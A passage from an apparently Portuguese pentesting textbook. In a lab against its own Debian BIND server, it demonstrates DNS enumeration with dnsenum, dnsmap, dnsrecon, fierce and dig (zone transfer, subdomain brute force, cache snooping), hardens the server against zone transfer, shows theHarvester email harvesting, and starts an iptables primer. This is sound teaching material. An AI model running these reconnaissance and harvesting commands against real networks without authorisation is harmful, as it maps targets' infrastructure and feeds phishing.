ed-checkconf\nCaso\tnão\tapareça\tnenhuma\tmensagem\tde\terro,\ta\tconfiguração\tdo\tservidor\tDNS\nestá\tOK.\nO\tKali\tLinux\tdeverá\tser\tconfigurado\tpara\tconsultar\to\tDNS\tdo\tDebian.\tPara\tisso,\nno\tKali\tLinux,\taltere\to\tarquivo\t\n/etc/resolv.conf\n\tpara\to\tseguinte\tconteúdo:\nnameserver\t192.168.1.102\nsearch\tkali.com.br\nDessa\tforma,\to\tKali\tLinux\tvai\trealizar\tconsultas\tDNS\tpor\tmeio\tdo\tservidor\n192.168.1.102.\nVerifique\tse\to\tservidor\tDNS\tdo\tDebian\testá\trespondendo\tperguntas\tcom\to\ncomando\t\nnslookup\n:\nroot@kali#\n\tnslookup\tkali.com.br\nServer:\t\t192.168.1.102\nAddress:\t192.168.1.102#53\nName:\t\t\t\tkali.com.br\nAddress:\t192.168.1.102\n5.3\tProgramas\tpara\tenumeração\tDNS\nOs\tprogramas\tpara\tenumeração\tDNS\ttêm\tcomo\tobjetivo\trealizar\to\tmapeamento\ndos\tservidores\tDNS\tativos.\tEsta\tseção\tapresentará\tas\tprincipais\tferramentas\tpara\ncoleta\tde\tinformação\tem\tDNS.\tLembrando\tque\testas\tnão\tsão\tas\túnicas\nferramentas\texistentes,\tporém\tas\tferramentas\tcitadas\tsão\tas\tprincipais\tutilizadas\nem\tuma\tvarredura\tDNS.\n5.3.1\tDNSenum\nA\tferramenta\tDNSenum\tpermite\tpesquisar\thosts,\tnomes\tde\tservidores,\tregistros\nMX,\tIPs\tetc.\tCaso\tdigite\tsomente\t\ndnsenum\n,\tsurgirão\ttodas\tas\topções\te\ncomandos\tpossíveis\tpara\tutilização\tda\tferramenta.\nroot@kali#\n\tdnsenum\tkali.com.brO\tresultado\tdo\tprograma\tserá\talgo\tsimilar\tao\tapresentado:\n-----\tkali.com.br\t-----\nHost's\taddresses:\nkali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nName\tServers:\nns1.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nns2.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nfirewall.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nMail\t(MX)\tServers:\nmail.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nTrying\tZone\tTransfers\tand\tgetting\tBind\tVersions:\nTrying\tZone\tTransfer\tfor\tkali.com.br\ton\tfirewall.kali.com.br\t...\nkali.com.br.\t\t86400\t\tIN\t\tSOA\t\tkali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tns1.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tns2.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tfirewall.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tMX\t\t0\nkali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nadmin.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nadministracao.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\ndns.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns2.kali.com.br.\nfirewall.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nftp.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\twww.kali.com.br.\nmail.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nns1.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nns2.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\npop3.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nrioclaro.kali.com.br.\t86400\t\tIN\t\tCNAME\t\twww.kali.com.br.\nservidor1.kali.com.br.\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\nservidor2.kali.com.br.\t86400\t\tIN\t\tCNAME\t\tns2.kali.com.br.\nsmtp.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nteste.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\nwww.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tkali.com.br.\nTrying\tZone\tTransfer\tfor\tkali.com.br\ton\tns2.kali.com.br\t...\nkali.com.br.\t\t86400\t\tIN\t\tSOA\t\tkali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tns1.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tns2.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tfirewall.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tMX\t\t0\nkali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nadmin.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nadministracao.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.dns.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns2.kali.com.br.\nfirewall.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nftp.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\twww.kali.com.br.\nmail.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nns1.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nns2.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\npop3.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nrioclaro.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\twww.kali.com.br.\nservidor1.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\nservidor2.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns2.kali.com.br.\nsmtp.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nteste.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\nwww.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tkali.com.br.\nTrying\tZone\tTransfer\tfor\tkali.com.br\ton\tns1.kali.com.br\t...\nkali.com.br.\t\t86400\t\tIN\t\tSOA\t\tkali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tns1.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tns2.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tNS\t\tfirewall.kali.com.br.\nkali.com.br.\t\t86400\t\tIN\t\tMX\t\t0\nkali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nadmin.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nadministracao.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\ndns.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns2.kali.com.br.\nfirewall.kali.com.br.\t\t86400\t\t\tN\t\tA\t\t192.168.1.102\nftp.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\twww.kali.com.br.\nmail.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nns1.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\nns2.kali.com.br.\t\t86400\t\tIN\t\tA\t\t192.168.1.102\npop3.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nrioclaro.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\twww.kali.com.br.\nservidor1.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\nservidor2.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns2.kali.com.br.\nsmtp.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tfirewall.kali.com.br.\nteste.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tns1.kali.com.br.\nwww.kali.com.br.\t\t86400\t\tIN\t\tCNAME\t\tkali.com.br.\nNote\tque\to\tDNSenum\trealiza\ta\ttransferência\tde\tzona\tpara\tcada\tregistro\t\nNS\n(\nns1\n,\nns2\n,\nfirewall\n),\tconseguindo\tenumerar\ttodos\tos\tregistros\tassociados\tao\tnosso\nservidor.\tO\tnosso\tservidor\tDNS\ttem\tuma\tfalha\tque\tpermite\ta\tum\tatacante\nmapear\ttoda\ta\trede\tpor\tmeio\tda\ttransferência\tde\tzona\t(somente\to\tservidor\nescravo\tdeve\testar\thabilitado\ta\tessa\tatividade,\te\tnão\tqualquer\tpessoa).\nVamos\tconfigurar\to\tnosso\tBIND\tpara\tcorrigir\tessa\tfalha.O\tarquivo\t\n/etc/bind/named.conf.options\n\tdo\tservidor\tDNS\t(máquina\tDebian)\ndeve\tter\to\tseguinte\tconteúdo:\noptions\t{\n\t\t\t\tdirectory\t\"/var/cache/bind\";\n\t\t\t\tallow-transfer\t{192.168.1.1;};\n};\n\t\nNota:\n\ta\tconfiguração\tdo\tarquivo\t\n/etc/bind/named.conf.options\n\té\tapenas\tuma\tconfiguração\texemplo.\nNele,\to\tnosso\tservidor\tDNS\tpermite\ttransferência\tde\tzona\tpara\to\tIP\t192.168.1.1.\tA\tmaneira\tmais\nrecomendada\tde\tconfigurar\tuma\ttransferência\tde\tzona\té\tentre\tservidores\tDNS\tprimário\te\tsecundário,\nporém,\tapenas\tpor\tquestões\tdidáticas,\tessa\tconfiguração\té\timplementada\te\tjá\tbloqueia\ttentativas\tde\ntransferência\tde\tzona.\n\t\n•\tVerifique\to\tarquivo\tde\tconfiguração:\nroot@debian#\t\nnamed-checkconf\n•\tReinicie\to\tserviço\tde\tDNS:\nroot@debian#\t\nservice\tbind9\tforce-reload\n•\tTente\trealizar\tnovamente\ta\tenumeração\tpor\tmeio\tdo\tDNSenum:\nroot@kali#\n\tdnsenum\tkali.com.br\nA\tsaída\tdo\tcomando\tDNSenum\tserá\tsimilar\ta\teste\tcódigo\t(editado\tpor\tmotivos\nvisuais):\nTrying\tZone\tTransfer\tfor\tkali.com.br\ton\tns2.kali.com.br\t...\nAXFR\trecord\n\tquery\tfailed:\tResponse\tcode\tfrom\tserver:\t\nREFUSED\nTrying\tZone\tTransfer\tfor\tkali.com.br\ton\tfirewall.kali.com.br\t...\nAXFR\n\trecord\tquery\tfailed:\tResponse\tcode\tfrom\tserver:\t\nREFUSED\nTrying\tZone\tTransfer\tfor\tkali.com.br\ton\tns1.kali.com.br\t...\nAXFR\t\nrecord\tquery\tfailed:\tResponse\tcode\tfrom\tserver:\t\nREFUSED\nbrute\tforce\tfile\tnot\tspecified,\tbay.\nAtente,\tleitor,\tpara\to\tfato\tde\tque\to\tDNSenum\ttenta\trealizar\ta\ttransferência\tde\nzona\tpara\tcada\tregistro\t\nNS\t\n(\nns1\n,\t\nns2\n,\t\nfirewall\n),\tmas\tdessa\tvez\tsem\tsucesso.\tIsso\nporque\tno\tarquivo\tde\tconfiguração\t\n/etc/bind/named.conf.options\n\té\tpermitida\ta\ntransferência\tde\tzona\tsomente\tpara\to\tIP\t192.168.1.1.\nServidores\tDNS\tque\tpermitem\ttransferência\tde\tzona\tapresentam\tuma\tfalha\ngravíssima,\tpois\to\tatacante\tobterá\ttoda\ta\ttopologia\t(quais\tsão\tos\tIPs\tque\npertencem\tàquele\tdomínio)\tda\trede,\tportanto\tlembre-se\tsempre\tde\tnuncapermitir\tuma\ttransferência\tde\tzona\t(embora\ta\ttransferência\tde\tzona\tnão\tpermita\numa\tinvasão,\to\tatacante\tterá\ta\tsua\tinfraestrutura\tmapeada).\nSabendo-se\tquais\tsão\tos\tdomínios\tda\trede\t(pela\ttransferência\tde\tzona\tou\tpor\nataques\tde\tforça\tbruta\t–\tconteúdo\ta\tser\tvisto\tmais\tadiante),\to\tdiagrama\tda\trede\té\nmontado\te\tpode\tser\tiniciada\ta\tbusca\tpor\tvulnerabilidades\tnaquele\tdomínio.\nGarantir\tque\to\tservidor\tDNS\tprimário\trealize\ta\ttransferência\tde\tzona\tsomente\npara\to\tservidor\tsecundário\té\tuma\tmedida\tde\tprevenção\t(não\tgarante\tque\ta\trede\nnão\tserá\tatacada,\tmas\tsua\ttopologia\tnão\tserá\tentregue\tde\tmaneira\ttão\tfácil\tao\natacante).\nPorém,\tmesmo\tem\tum\tcenário\tem\tque\tnão\té\tpossível\trealizar\ta\ttransferência\tde\nzona,\tpode-se\ttentar\tdescobrir\tquais\tsão\tas\tmáquinas\tda\trede\tpor\tmeio\tde\nataques\tde\tforça\tbruta\t(brute\tforce).\tNessa\topção,\tuma\tlista\tde\tpalavras\té\tcriada\ncom\to\tintuito\tde\ttestar\tuma\ta\tuma,\taté\tdescobrir\tqual\té\to\tnome\tque\tcombina\tcom\no\tdomínio\tDNS.\nCrie\tuma\tlista\tde\tpalavras\tcontendo\tos\tnomes\tdo\tdomínio\tDNS.\tPor\texemplo:\nadm\n,\t\nfirewall\n\tetc.\tColoque\ttambém\tpalavras\tque\tnão\tfazem\tparte\tdo\tDNS,\tcomo\npentest\n,\t\nauditoria\n\tetc.\n•\tPara\tusar\ta\topção\tde\tlista\tde\tpalavras,\tutilize\ta\tsubopção\t\n–f\n:\nroot@kali#\n\tdnsenum\t–f\twordlist\tkali.com.br\n•\tO\tDNSenum\tcontém\tuma\tlista\tde\tpalavras\texcelente\tque\tpode\tser\tutilizada:\nroot@kali#\n\tdnsenum\t–f\t\n/usr/share/dnsenum/dns.txt\n\tkali.com.br\n5.3.2\tDNSmap\nOutra\tferramenta\tinteressante\te\ttão\teficaz\tquanto\to\tDNSenum\té\to\tDNSmap,\tque\njá\tvem\tcom\tuma\tlista\tde\tpalavras\t(wordlist)\tembutida\tpara\tpesquisas.\nroot@kali#\n\tdnsmap\tkali.com.br\nA\tsubopção\t\n–w\n\tpossibilita\ta\tutilização\tde\tlista\tde\tpalavras:\nroot@kali#\n\tdnsmap\tkali.com.br\t\n–w\t\n/root/wordlist\nO\tresultado\tdo\tDNSmap\t(para\tcada\tpalavra\tencontrada\tna\tlista\tde\tpalavras):\n[+]\tsearching\t(sub)domains\tfor\tkali.com.br\tusing\tbuilt-in\twordlist\n[+]\tusing\tmaximum\trandom\tdelay\tof\t10\tmillisecond(s)\tbetween\trequests\nadmin.kali.com.br\nIP\taddress\t#1:\t192.168.1.102[+]\twarning:\tinternal\tIP\taddress\tdisclosed\nfirewall.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\nftp.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\nmail.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\nns1.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\nns2.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\npop3.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\nsmtp.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\nwww.kali.com.br\nIP\taddress\t#1:\t192.168.1.102\n[+]\twarning:\tinternal\tIP\taddress\tdisclosed\n[+]\t9\t(sub)domains\tand\t9\tIP\taddress(es)\tfound\n[+]\t9\tinternal\tIP\taddress(es)\tdisclosed\n[+]\tcompletion\ttime:\t11\tsecond(s)\n5.3.3\tDNSrecon\nNosso\tpróximo\taliado\té\to\t\nDNSrecon\n,\tsendo\tmais\tuma\topção\tpara\tconsultas\tDNS\ne\tenumeração\tde\tdomínios.\nOpções:\n-d\ndomínio\nDomínio\ta\tser\ttestado.\n-D\nwordlist\nLista\tde\tpalavras\ta\tserem\tutilizadas\tno\tprocesso\tde\tadivinhação\tdo\tdomínio.\tCada\tpalavra\té\ttestada\tcomo\nnome\tde\tdomínio.-t\t\nreg\nTipo\tde\tregistro\ta\tser\tusado.\nExemplos:\nroot@kali#\n\tdnsrecon\t\n–d\n\tkali.com.br\nroot@kali#\n\tdnsrecon\t\n–d\n\tkali.com.br\t\n–D\t\n/root/wordlist\t\n–t\tbrt\nVamos\ttentar\trealizar\tuma\ttransferência\tde\tzona\tcom\to\tregistro\t\naxfr\n:\nroot@kali#\n\tdnsrecon\t\n–d\n\tkali.com.br\t\n–t\taxfr\nA\tresposta\té\tmostrada\ta\tseguir:\n[*]\tTesting\tNS\tServers\tfor\tZone\tTransfer\n[*]\tChecking\tfor\tZone\tTransfer\tfor\tkali.com.br\tname\tservers\n[*]\tResolving\tSOA\tRecord\n[*]\t\t\t\tSOA\tkali.com.br\t192.168.1.102\n[*]\tResolving\tNS\tRecords\n[*]\tNS\tServers\tfound:\n[*]\t\t\t\tNS\tns1.kali.com.br\t192.168.1.102\n[*]\t\t\t\tNS\tns2.kali.com.br\t192.168.1.102\n[*]\t\t\t\tNS\tfirewall.kali.com.br\t192.168.1.102\n[*]\tRemoving\tany\tduplicate\tNS\tserver\tIP\tAddresses...\n[*]\t\t\n[*]\tTrying\tNS\tserver\t192.168.1.102\n[*]\t192.168.1.102\tHas\tport\t53\tTCP\tOpen\n[-]\tZone\tTransfer\tFailed!\n[-]\nAtente\tque\to\tDNSrecon\ttambém\tnão\tconsegue\tefetuar\ta\ttransferência\tde\tzona.\n5.3.4\tFierce\nO\tFierce\té\tmais\tuma\tferramenta\texcelente\tpara\tenumeração\tde\tdomínios\tDNS.\nOpções:\n-dns\nServidor\tDNS.\n-wordlist\nLista\tde\tpalavras\tem\tque\tserão\ttestados\tataques\tde\tforça\tbruta.\nExemplo:\nroot@kali#\n\tfierce\t–dns\tkali.com.br\t–wordlist\t/root/wordlist\nObviamente\thá\tmuito\tmais\tprogramas\tpara\tenumeração\tDNS\tdo\tque\tapenas\tos\ncitados,\te,\tcom\tcerteza,\tum\tque\tvale\ta\tpena\tser\tcitado\té\to\tcomando\t\ndig\n,\tque\ténativo\tdo\tLinux\te\tpode\tser\tutilizado\tpara\tdiversas\tfinalidades,\tcomo\ntransferência\tde\tzona,\tenumeração\tda\tversão\tDNS\tetc.\nPara,\tpor\texemplo,\trealizarmos\tuma\ttransferência\tde\tzona\tcom\to\t\ndig\n,\tvamos\nconsultar\to\tregistro\t\naxfr\n:\nroot@kali#\n\tdig\t@192.168.1.102\tkali.com.br\taxfr\nPara,\tpor\texemplo,\tenumerarmos\ta\tversão\tdo\tBIND\tno\tsistema\talvo,\tvamos\tver\no\tconteúdo\tdo\tregistro\t\nchaos\n:\nroot@kali#\n\tdig\t@192.168.1.102\tversion.bind\ttxt\tchaos\nA\tresposta\tserá\t(editado\tpor\tmotivos\tvisuais):\n;;\tQUESTION\tSECTION:\n;version.bind.\t\tCH\t\tTXT\n;;\tANSWER\tSECTION:\nversion.bind.\t0\tCH\tTXT\t\"\n9.8.4-rpz2+rl005.12-P1\n\"\nNo\tcampo\t\n;;\tANSWER\tSECTION:\n\ttemos\ta\tversão\tBIND\tque\testá\trodando\tno\nservidor.\nAlgo\tbem\tinteressante\tque\tpodemos\tfazer\tcom\to\t\ndig\n\té\tbisbilhotar\to\tcache\tDNS\nalvo.\tPor\texemplo,\tquando\talguém\tacessa\tdeterminado\tsite\tpor\tmeio\tde\ndeterminado\tservidor\tDNS,\to\tDNS\tarmazena\ttemporariamente\ta\trequisição\ndaquele\tsite.\tEntão,\tpor\texemplo,\tse\talguém\tacessou\t\nwww.site.com.br\n\tpor\tmeio\ndo\tservidor\tDNS\t192.168.1.102,\tnós\tpodemos\tconsultar\to\tcache\tlocal\tdo\nservidor\tDNS\t192.168.1.102\tpara\tsaber\tse\talguém\tda\trede\tacessou\nwww.site.com.br\n.\nRealize\ta\tconsulta\tao\tcache\tdo\tservidor\tDNS\t192.168.1.102:\nroot@kali#\n\tdig\t@192.168.1.102\twww.novatec.com.br\tA\t+norecurse\nA\tresposta\tserá\t(editado\tpor\tmotivos\tvisuais):\n;\t<<>>\tDiG\t9.8.4-rpz2+rl005.12-P1\t<<>>\t@192.168.1.1\twww.novatec.com.br\tA\t+norecurse\n;\t(1\tserver\tfound)\n;;\tglobal\toptions:\t+cmd\n;;\tGot\tanswer:\n;;\t->>HEADER<<-\topcode:\tQUERY,\tstatus:\tNOERROR,\tid:\t40840\n;;\tflags:\tqr\tra;\tQUERY:\t1,\t\nANSWER:\t0\n,\tAUTHORITY:\t3,\tADDITIONAL:\t3\n;;\tQUESTION\tSECTION:\n;www.novatec.com.br.\t\tIN\t\tA\nPerceba\tque\ta\tlinha\n\t;;\tflags:\tqr\tra;\tQUERY:\t1,\tANSWER:\t0,\tAUTHORITY:\t13,ADDITIONAL:\t12\n\ttem\to\tcampo\t\nANSWER\n\tmarcado\tcomo\t0,\tindicando\tque\to\nsite\tnão\tfoi\tacessado\trecentemente.\nAgora,\tacesse\to\tsite\te\tfaça\tnovamente\ta\tmesma\tpergunta\tao\tservidor\tDNS.\tA\nresposta\tserá\to\tcampo\t\nANSWER\n\tmarcado\tcomo\tum\tvalor\tdiferente\tde\t0\t(a\nquantidade\tde\trespostas\tvaria\tse\to\tsite\tutiliza\tload\tbalance\n1\n),\tindica\tque\to\tsite\tfoi\nacessado\trecentemente.\nA\tresposta\tdo\tcomando\t\ndig\n\té\tmostrada\ta\tseguir:\n;\t<<>>\tDiG\t9.8.4-rpz2+rl005.12-P1\t<<>>\t@192.168.1.102\twww.novatec.com.br\tA\t+norecurse\n;\t(1\tserver\tfound)\n;;\tglobal\toptions:\t+cmd\n;;\tGot\tanswer:\n;;\t->>HEADER<<-\topcode:\tQUERY,\tstatus:\tNOERROR,\tid:\t3827\n;;\tflags:\tqr\tra;\tQUERY:\t1,\t\nANSWER:\t2\n,\tAUTHORITY:\t3,\tADDITIONAL:\t3\n;;\tQUESTION\tSECTION:\n;www.novatec.com.br.\t\t\t\t\t\t\tIN\t\tA\n;;\tANSWER\tSECTION:\nwww.novatec.com.br.\t\t3560\t\tIN\t\tCNAME\t\tnovatec.com.br.\nnovatec.com.br.\t\t\t\t\t\t3560\t\tIN\t\tA\t\t\t\t\t\t186.202.25.177\n5.4\tColeta\tde\temail\nApós\tenumerar\ta\ttopologia\tde\trede,\tcoletar\temails\trelativos\tàquele\tdomínio\té\nextremamente\timportante,\tpois,\tdessa\tforma,\tpodemos\tsaber\tquem\tsão\tas\npessoas\tque\tfazem\tparte\tdaquele\tdomínio.\nDe\tposse\tdas\tcontas\tde\temail\tválidas,\to\tatacante\tpoderá\tenviar\tum\tphishing\n(email\tfalso)\tpedindo\ta\tinstalação\tde\tprogramas\tmaliciosos,\tou\tmesmo\tenviar\num\temail\tbomba\tcom\tvárias\tmensagens,\tapenas\tpara\tsobrecarregar\to\tservidor\nSMTP.\nO\tprograma\ttheHarvester\tvai\tnos\tauxiliar\tnesse\tlaboratório.\nOpções:\n-\nd\nDomínio\ta\tser\ttestado.\n-\nb\nDetermina\to\tmecanismo\tde\tbusca\tque\tvai\tlocalizar\tos\temails.\tPode\tser\to\tGoogle,\to\tBing,\to\tPGP\tetc.\tA\topção\t\nall\n\tindica\ntodos\tos\tmecanismos\tde\tbusca.\nroot@kali#\n\ttheharvester\t–d\tdomínio.com.br\t–b\tallExemplo:\nroot@kali#\n\ttheharvester\t–d\tgmail.com\t–b\tall\n\t\nNota:\n\to\tMetasploit\tcontém\tum\tmódulo\tpara\tpesquisa\tde\temails\n(\nauxiliary/gather/search_email_collector\n).\tRecomendo\tao\tleitor\tque\taprenda\ta\tutilizá-lo.\n\t\n5.5\tFirewall\tiptables\nIptables\té\to\tfirewall-padrão\tpara\talgumas\tdistribuições\tLinux.\tPor\tmeio\tdo\niptables\té\tpossível\tcriar\tregras\tde\tbloqueio\tde\tpacotes\tde\tdados,\tpermitir\tacesso\na\tmáquinas,\tredirecionar\to\ttráfego\tde\tdados\tetc.\nO\tiptables\té\tdividido\tem\ttrês\ttabelas:\tFilter,\tNAT\te\tMangle.\n•\t\nFilter\n\t–\tTabela-padrão\tutilizada\tpara\tfiltragens\tmais\tsimples,\tcomo\tbloqueio\nde\tportas\te\tprotocolos.\n•\t\nNAT\n\t–\tUtilizada\tquando\thá\tnecessidade\tde\tse\trealizar\tredirecionamento\tdo\ntráfego\tde\tdados\tpara\toutras\tportas\tou\tIPs.\n•\t\nMangle\n\t–\tAlterações\tespeciais\tnos\tpacotes.\nEm\tcada\ttabela\texistem\tchains.\tCada\tchain\té\tresponsável\tpor\trealizar\tum\ttipo\tde\nfiltragem.\tPor\texemplo:\ta\tchain\t\nINPUT\n\tda\ttabela\tFilter\té\tresponsável\tpor\tcuidar\ndo\ttráfego\tde\tdados\tque\tchegam\tao\tfirewall.\tA\tchain\t\nPREROUTING\n\tda\ttabela\nNAT\té\tresponsável\tpor\tredirecionar\to\ttráfego\tde\tdados\tpara\tos\tIPs\tda\trede\n(lembrando\tque\to\tfirewall\tnormalmente\té\to\tdispositivo\tque\tvai\tconectar\ta\trede\ninterna\tao\tmundo\texterno\t–\tcomo\ta\tinternet).\nA\ttabela\tFilter\té\tdivida\tem\ttrês\tchains:\n•\t\nINPUT\n\t–\tTráfego\tde\tdados\tque\tchegam\taté\ta\tmáquina.\n•\t\nOUTPUT\n\t–\tTráfego\tde\tdados\tque\tsaem\tda\tmáquina.\n•\t\nFORWARD\n\t–\tRedirecionamento\tdo\ttráfego\tde\tdados\tda\tprópria\tmáquina\npara\toutra\tporta.\nA\ttabela\tNAT\té\tdividida\tem\ttrês\tchains:\n•\t\nPREROUTING\n\t–\tTráfego\tde\tdados\tque\trequerem\talterações\tantes\tde\tserem\nroteáveis.\tPor\texemplo,\tquando\tse\tutiliza\to\tDNAT\te\tpara\to\tredirecionamentode\tportas\tpara\toutros\tIPs\tque\testão\tconectados\tsob\to\tfirewall.\n•\t\nPOSTROUTING\n\t–\tTráfego\tde\tdados\tque\trequerem\talterações\tdepois\tde\nserem\troteáveis,\tpor\texemplo,\tquando\tse\tutiliza\to\tSNAT\te\to\tIP\nMasquerading.\n•\t\nOUTPUT\n\t–\tTráfego\tde\tdados\tque\tsaem\tdo\tNAT.\nA\ttabela\tMangle\tnão\tserá\tabordada\tneste\tlivro.\n5.5.1\tComandos\tpara\tgerenciamento\tdo\tiptables\nOs\tprincipais\tcomandos\tpara\tgerenciamento\tdo\tiptables\tsão:\n–L\nLista\tas\tregras\tdo\tiptables\t(por\tpadrão\té\ta\ttabela\tFilter).\n-t\ntable\nEscolhe\to\ttipo\tda\ttabela:\nfilter\nTabela\tFilter.\tÉ\ta\ttabela-padrão\tcaso\tnenhuma\tseja\tespecificada.\nnat\nTabela\tNAT.\nmangle\nTabela\tMangle.\nExemplos:\niptables\t–L\nLista\tas\tregras\tda\ttabela\tFilter.\niptables\t–L\t–t\tfilter\nLista\tas\tregras\tda\ttabela\tFilter.\niptables\t–L\t–t\tnat\nLista\tas\tregras\tda\ttabela\tNAT.\niptables\t–L\t–t\tmangle\nLista\tas\tregras\tda\ttabela\tMangle.\nOutros\tcomandos:\n-d\t\ndestino\nAdiciona\tum\tdestino.\n-s\t\norigem\nAdiciona\tuma\torigem.\n-p\t\nproto\nAplica\tregra\tsobre\to\tprotocolo\tescolhido:\ntcp\nProtocolo\tTCP.\nupd\nProtocolo\tUDP.\nicmp\nProtocolo\tICMP.\n--sport\nporta\nDefine\ta\tporta\tde\torigem.\tDeve\tvir\tacompanhado\tda\topção\t\n–p\n.--dport\nporta\nDefine\ta\tporta\tde\tdestino.\tDeve\tvir\tacompanhado\tda\topção\t\n–p\n.\n-j\t\nação\nIndica\tqual\tação\ttomar\tquando\tuma\tregra\té\tcriada.\tAs\tprincipais\tações\tsão:\nDROP\nBloqueia\to\ttráfego\tde\tdados.\nREJECT\nRejeita\to\ttráfego\tde\tdados.\nACCEPT\nAceita\to\ttráfego\tde\tdados.\n!\nExceção\ta\tregra\tque\tvier\tdepois\tde\t\n!\n.\n-i\t\niface\nInterface\tde\tentrada\tde\tdados.\n-o\t\noface\nInterface\tde\tsaída\tde\tdados.\n–A\t\nchain\nAdiciona\tuma\tregra.\n–D\t\nchain\nnum\nDeleta\ta\tregra\tde\tnúmero\t\nnum\n.\n-F\nApaga\ttodas\tas\tregras.\n-I\t\nchain\nnum\nInsere\tuma\tregra\tde\tnúmero\t\nnum\n\tna\tchain\tescolhida.\tSe\t\nnum=1\n\té\tinserida\ta\tprimeira\tregra.\tSe\t\nnum=2\n\té\ninserida\ta\tsegunda\tregra,\te\tassim\tsucessivamente.\nExemplos\tde\tuso\tdo\tiptables:\n•\tTodo\ttráfego\tque\tsair\tda\tminha\tmáquina\tcom\tdestino\tao\tIP\t127.0.0.1\té\nbloqueado:\niptables\t–A\tOUTPUT\t–t\tfilter\t–d\t127.0.0.1\t–j\tDROP\t\tUsa\ta\ttabela\tFilter.\niptables\t–A\tOUTPUT\t–d\t127.0.0.1\t–j\tDROP\t\tAssim\tcomo\tno\texemplo\tacima,\ttambém\tusa\ta\ttabela\nFilter.\n•\tTodo\ttráfego\tque\tchegar\tcomo\torigem\tsendo\to\tIP\t127.0.0.1\te\tdestino\n192.168.1.102\tpelo\tprotocolo\tTCP\té\trejeitado:\niptables\t–A\tINPUT\t–s\t127.0.0.1\t–d\t192.168.1.102\t–p\ttcp\t–j\tREJECT\n•\tTodo\ttráfego\tque\tchegar\tcomo\torigem\tsendo\to\tIP\t127.0.0.1\te\tdestino\n192.168.1.102\tpelo\tprotocolo\tTCP\te\tporta\tde\tdestino\t80\té\tbloqueado:\niptables\t–A\tINPUT\t–